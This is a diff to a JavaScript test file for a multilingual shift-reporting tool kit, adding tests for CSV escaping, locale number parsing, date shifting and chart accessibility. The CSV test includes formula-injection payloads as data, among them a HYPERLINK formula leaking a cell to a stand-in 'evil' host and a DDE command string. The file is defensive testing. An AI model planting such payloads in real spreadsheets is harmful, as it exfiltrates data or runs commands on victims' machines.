@@ -27,6 +27,44 @@ test('today is the date on the device clock, so a night shift after midnight log
   assert.deepEqual(plain(ToolKit.rangePreset('all')), { from: '', to: '' });
 });
 
+test('a CSV cell that a spreadsheet would run as a formula is kept as text', () => {
+  const { ToolKit } = load('en');
+  assert.equal(ToolKit.csvSafe('=HYPERLINK("http://evil/?"&A1,"click")'), '\'=HYPERLINK("http://evil/?"&A1,"click")');
+  assert.equal(ToolKit.csvSafe("+cmd|' /C calc'!A0"), "'+cmd|' /C calc'!A0");
+  assert.equal(ToolKit.csvSafe('@SUM(A1)'), "'@SUM(A1)");
+  assert.equal(ToolKit.csvSafe('-2+3'), "'-2+3");
+  assert.equal(ToolKit.csvSafe('\tnote'), "'\tnote");
+  // Numbers and ordinary text stay as they are.
+  assert.equal(ToolKit.csvSafe('-5'), '-5');
+  assert.equal(ToolKit.csvSafe('+12.5'), '+12.5');
+  assert.equal(ToolKit.csvSafe('-0,3%'), '-0,3%');
+  assert.equal(ToolKit.csvSafe('Crushed box'), 'Crushed box');
+  assert.equal(ToolKit.csvSafe(''), '');
+  // On the German and Albanian pages too (the decimal comma makes no difference).
+  assert.equal(load('sq').ToolKit.csvSafe('=1+1'), "'=1+1");
+});
+
+test('the units handled in a handover are read in the page\'s number format', () => {
+  // The English page writes 3,000; the German and Albanian pages write 3.000.
+  assert.equal(load('en').ToolKit.parseNumber('3,000'), 3000);
+  assert.equal(load('en').ToolKit.parseNumber('12,500'), 12500);
+  assert.equal(load('de').ToolKit.parseNumber('3.000'), 3000);
+  assert.equal(load('sq').ToolKit.parseNumber('12.500,5'), 12500.5);
+});
+
+test('the example week moves forward by whole weeks, so it is recent and keeps its weekdays', () => {
+  const { ToolKit } = load('en', '2026-10-02T10:00:00Z');
+  const rows = ['2026-09-14|Early|7', '2026-09-20|Late|3', 'note without a date'];
+  // 20 September is 12 days before 2 October: one whole week forward, Monday stays a Monday.
+  assert.deepEqual(plain(ToolKit.recentExample(rows)), ['2026-09-21|Early|7', '2026-09-27|Late|3', 'note without a date']);
+  // An example that ends today or in the future is left alone.
+  assert.deepEqual(plain(ToolKit.recentExample(['2026-10-02|x'])), ['2026-10-02|x']);
+  assert.deepEqual(plain(ToolKit.recentExample(['2026-10-09|x'])), ['2026-10-09|x']);
+  // Empty lines are kept on request, so rows keep the line numbers of the file.
+  assert.deepEqual(plain(ToolKit.parseRows('a,1\n\nb,2\n')), [['a', '1'], ['b', '2']]);
+  assert.deepEqual(plain(ToolKit.parseRows('a,1\n\nb,2\n', { keepBlank: true })), [['a', '1'], [], ['b', '2']]);
+});
+
 test('a period keeps only the rows dated inside it', () => {
   const { ToolKit } = load();
   const rows = [{ date: '2026-09-01' }, { date: '2026-09-05' }, { date: '2026-09-09' }, { date: '' }];
@@ -119,7 +157,9 @@ test('the trend chart draws one column per day, marks the highest and exports a 
   const trend = ToolKit.trendBuckets([{ date: '2026-09-01', u: 1 }, { date: '2026-09-02', u: 5 }, { date: '2026-09-03', u: 2 }], (row) => row.u);
   const figure = ToolKit.trendFigure(trend, { title: 'Damage: trend', unit: 'Damages', average: 'Average' }, 'damage-control');
   document.body.append(figure);
-  assert.equal(figure.querySelectorAll('svg g[role=img]').length, 3);
+  // One image with one name: the columns are tooltips, not tab stops.
+  assert.equal(figure.querySelectorAll('svg g.tr-col > title').length, 3);
+  assert.equal(figure.querySelectorAll('svg [tabindex]').length, 0);
   assert.equal(figure.querySelectorAll('button').length, 2);
   assert.match(figure.querySelector('svg').textContent, /Average/);
 });
